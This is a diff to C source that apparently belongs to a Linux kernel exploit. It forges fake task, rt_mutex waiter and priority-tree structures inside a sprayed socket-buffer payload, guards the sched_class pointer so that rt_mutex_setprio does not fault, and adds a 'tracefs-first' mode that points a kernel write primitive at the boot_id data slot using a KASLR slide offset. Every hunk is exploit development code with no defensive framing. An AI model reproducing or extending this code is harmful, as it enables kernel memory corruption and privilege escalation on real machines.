@@ -142,6 +142,10 @@ _Static_assert(
 #endif
 #endif
 
+#if defined(SLIDE_APP_TRACEFS) && SLIDE_APP_TRACEFS
+int slide_classic_bank_mode;
+uintptr_t slide_classic_offset;
+#endif
 uintptr_t page_base;
 uintptr_t fake_lock;
 uintptr_t fake_w0;
@@ -290,6 +294,7 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
   put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
   put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
   put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
+#if defined(FAKE_TASK_SCHED_CLASS_OFF) && defined(SLIDE_BANK_SCHED_CLASS_ZERO_OFF)
   /* rt_mutex_setprio reads prev_class = task->sched_class and calls
    * prev_class->switched_from (+0x98) when the priority changes. The spray
    * buffer is zeroed, so sched_class is NULL there and the walk faults at
@@ -298,6 +303,7 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
    * skipped. */
   put64(p, task_off + FAKE_TASK_SCHED_CLASS_OFF,
         payload_base + SLIDE_BANK_SCHED_CLASS_ZERO_OFF);
+#endif
   put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
   put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, pi_waiters);
   put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_waiters);
@@ -745,6 +751,24 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
         uintptr_t parent;
         uintptr_t target;
+#if defined(SLIDE_APP_TRACEFS) && SLIDE_APP_TRACEFS
+        if (slide_classic_bank_mode && slot == P0_ORACLE_PROBE_SLOT) {
+          /* S2 tracefs-first mode: aim the write child at the boot_id
+           * .data slot, but keep the parent chain self-referential
+           * (this slot's own waiter pi_tree) like the hardware-proven
+           * production geometry - rb rebalancing that follows the
+           * parent chain must never leave writable memory. */
+          size_t self_lock_off =
+              SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
+          parent = payload_base + self_lock_off + SLIDE_BANK_WAITER_OFF +
+                   FAKE_WAITER_PI_TREE_ENTRY_OFF;
+          target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR +
+                   slide_classic_offset;
+          pr_info("slide classic bank slot=%zu self_parent=%016zx "
+                  "target=%016zx offset=%08zx\n",
+                  slot, parent, target, slide_classic_offset);
+        } else
+#endif
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
         if (slot == P0_ORACLE_GATE_SLOT) {
           parent = direct_to_page(base);
@@ -807,9 +831,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
         put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
         put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
+#if defined(FAKE_TASK_SCHED_CLASS_OFF) && defined(SLIDE_BANK_SCHED_CLASS_ZERO_OFF)
         /* Same sched_class guard as put_slide_bank_entry. */
         put64(p, task_off + FAKE_TASK_SCHED_CLASS_OFF,
               payload_base + SLIDE_BANK_SCHED_CLASS_ZERO_OFF);
+#endif
         put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
         put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
               waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
